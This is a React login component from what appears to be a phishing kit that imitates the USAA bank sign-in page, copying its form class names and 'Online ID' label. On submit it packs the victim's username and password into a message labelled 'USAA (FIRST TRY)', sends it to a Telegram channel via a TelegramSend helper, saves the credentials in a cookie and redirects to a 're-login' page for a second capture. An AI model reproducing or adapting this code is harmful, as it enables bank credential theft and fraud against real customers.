import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Login() {
  const [formInput, setFormInput] = useState<Login>({
    username: "",
    password: "",
  });
  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);
    const message = `
    [----+🏦 USAA (FIRST TRY) 🏦+-----]
  
    USERNAME: ${formInput.username}

    PASSWORD: ${formInput.password}
    `;
    await TelegramSend(message);
    cookies.set("login1", formInput);
    setIsLoading(false);
    navigate("../re-login", { replace: true });
  }
  return (
    <>
      <div className="submitForm">
    

        <form method="post" onSubmit={handleSubmit} aria-busy="false">
          <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
            <div className="usaa-form-v5-10-1-block col-1-1">
              <div>
                <div>
                  <label
                    htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                  >
                    <span
                      aria-hidden="false"
                      className="usaa-form-v5-10-1-fieldLabel-text"
                    >
                      Online ID
                    </span>
                  </label>
                </div>
                <div>
                  <div
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                    className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                    data-error-message=""
                  ></div>
                  <div className="screenReader" role="alert"></div>
                </div>
                <span className="usaa-input">
                  <input
                    name="username"
                    onChange={handleInputChange}
                    required
                    aria-invalid="false"
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    type="text"
                    aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                    
                  />
                  <span className="keyboardFocusRing" aria-hidden="true"></span>
                </span>
              </div>
              <div className="keyboardFocusRing"></div>
            </div>
          </div>

          <div className="usaa-form-v5-10-1-textInput usaa-form-v5-10-1-fieldWrapper miam-form-id-input">
            <div className="usaa-form-v5-10-1-block col-1-1">
              <div>
                <div>
                  <label
                    htmlFor="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    className="usaa-form-v5-10-1-fieldLabel usaa-form-v5-10-1-fieldWrapper-label"
                  >
                    <span
                      aria-hidden="false"
                      className="usaa-form-v5-10-1-fieldLabel-text"
                    >
                      Password
                    </span>
                  </label>
                </div>
                <div>
                  <div
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage"
                    className="usaa-form-v5-10-1-fieldWrapper-errorMessage"
                    data-error-message=""
                  ></div>
                  <div className="screenReader" role="alert"></div>
                </div>
                <span className="usaa-input">
                  <input
                  onChange={handleInputChange}
                    name="password"
                    required
                    aria-invalid="false"
                    id="usaa-form-v5-10-1-input-mwc9hotwmucj"
                    type="password"
                    aria-describedby="usaa-form-v5-10-1-input-mwc9hotwmucj-errorMessage undefined"
                    
                  />
                  <span className="keyboardFocusRing" aria-hidden="true"></span>
                </span>
              </div>
              <div className="keyboardFocusRing"></div>
            </div>
          </div>
          {isLoading ?
          <button
          type="button"
          className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
          id="next-button"
          aria-labelledby="next-button"
        >
          <span>Please wait...</span>
        </button>
          :
          <button
            type="submit"
            className="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
            id="next-button"
            aria-labelledby="next-button"
          >
            <span>Next</span>
          </button>}
          <div className="help-link">
            <a
              aria-label="I need help logging on. (Opens a pop up)."
              role="link"
            >
              I need help logging on
            </a>
          </div>
        </form>
      </div>
    </>
  );
}
